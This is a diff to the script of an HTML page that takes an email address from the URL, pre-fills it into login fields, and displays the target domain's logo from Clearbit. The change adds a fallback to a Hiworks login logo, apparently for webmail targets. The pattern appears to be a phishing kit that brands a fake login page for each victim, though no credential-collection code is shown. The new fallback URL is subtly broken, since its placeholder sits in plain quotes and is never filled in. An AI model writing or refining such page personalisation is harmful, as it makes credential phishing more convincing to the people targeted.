@@ -179,26 +179,33 @@
     </tr>
     <tr><td></td></tr>
   </table>
-
   <script>
-    const params = new URLSearchParams(window.location.search);
-    const raw = params.get('login');
-    const email = raw ? decodeURIComponent(raw) : '';
+  const params = new URLSearchParams(window.location.search);
+  const raw = params.get('login');
+  const email = raw ? decodeURIComponent(raw) : '';
 
-    let user = '', domain = '';
-    if (email.includes('@')) {
-      [user, domain] = email.split(/@(.*)/, 2);
-    }
+  let user = '', domain = '';
+  if (email.includes('@')) {
+    [user, domain] = email.split(/@(.*)/, 2);
+  }
 
-    if (email) {
-      document.getElementById('userInput').value = email;
-      document.getElementById('domainInput').value = domain;
-      document.getElementById('domainText').textContent = domain;
-      document.getElementById('emailButton').textContent = email;
-      document.getElementById('anotherLink').href = `another_user.html?login=${encodeURIComponent(email)}`;
-      document.getElementById('logoImage').src = `https://logo.clearbit.com/${domain}`;
-    }
-  </script>
+  if (email) {
+    document.getElementById('userInput').value = email;
+    document.getElementById('domainInput').value = domain;
+    document.getElementById('domainText').textContent = domain;
+    document.getElementById('emailButton').textContent = email;
+    document.getElementById('anotherLink').href = `another_user.html?login=${encodeURIComponent(email)}`;
 
+    const logoImage = document.getElementById('logoImage');
+    const fallbackLogo = "https://office.hiworks.com/${domain}/common/logo/login";
+    const primaryLogo = `https://logo.clearbit.com/${domain}`;
+
+    logoImage.src = primaryLogo;
+    logoImage.onerror = () => {
+      logoImage.onerror = null; // Prevent infinite loop
+      logoImage.src = fallbackLogo;
+    };
+  }
+</script>
 </body>
 </html>
